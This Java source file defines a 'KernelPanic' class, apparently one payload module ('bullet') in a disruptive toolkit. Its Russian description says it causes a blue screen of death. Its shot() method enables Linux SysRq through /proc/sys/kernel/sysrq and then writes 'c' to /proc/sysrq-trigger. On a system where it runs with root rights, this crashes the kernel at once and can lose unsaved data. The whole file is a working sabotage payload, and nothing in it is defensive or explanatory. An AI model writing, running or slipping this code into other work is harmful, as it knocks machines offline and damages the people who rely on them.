package bullets;

import lombok.Getter;

import java.io.FileWriter;
import java.io.IOException;

@Getter
public class KernelPanic implements Bullet{
    private final String name = "BSOD / Kernel panic";
    private final String description = "Вызывает синий экран смерти";

    @Override
    public void shot() throws IOException {
        try (FileWriter fw = new FileWriter("/proc/sys/kernel/sysrq")) {
            fw.write("1");
        }

        try (FileWriter fw = new FileWriter("/proc/sysrq-trigger")) {
            fw.write("c");
        }
    }
}
